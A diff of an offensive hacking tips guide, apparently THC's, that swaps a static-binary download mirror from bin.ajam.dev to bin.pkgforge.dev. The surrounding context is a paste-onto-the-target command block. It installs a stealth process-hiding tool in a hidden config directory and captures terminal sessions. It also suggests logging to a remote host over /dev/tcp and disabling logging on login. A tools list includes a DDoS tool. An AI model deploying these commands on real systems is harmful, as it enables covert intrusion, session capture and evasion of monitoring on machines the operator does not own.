@@ -2277,7 +2277,7 @@ Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
-&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/$(uname -m)/Baseutils/util-linux/script" \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/Baseutils/util-linux/script" \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
@@ -2285,7 +2285,7 @@ command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 ```
 
 - Combined with zapper to hide command options from the process list.
-- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
+- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [pkgforge](https://bin.pkgforge.dev). 
 - Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 - Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.
 
@@ -2578,7 +2578,7 @@ DDoS
 1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.
 
 Static Binaries / pre-compiled Tools
-1. https://bin.ajam.dev ([github](https://github.com/Azathothas/Toolpacks/tree/main), [hysp project](https://github.com/metis-os/hysp-pkgs))
+1. https://bin.pkgforge.dev https://pkgs.pkgforge.dev ([github](https://github.com/pkgforge/soarpkgs), [Soar Project](https://github.com/pkgforge/soar))
 1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
 2. https://lolbas-project.github.io/ (Windows)
 1. https://iq.thc.org/cross-compiling-exploits
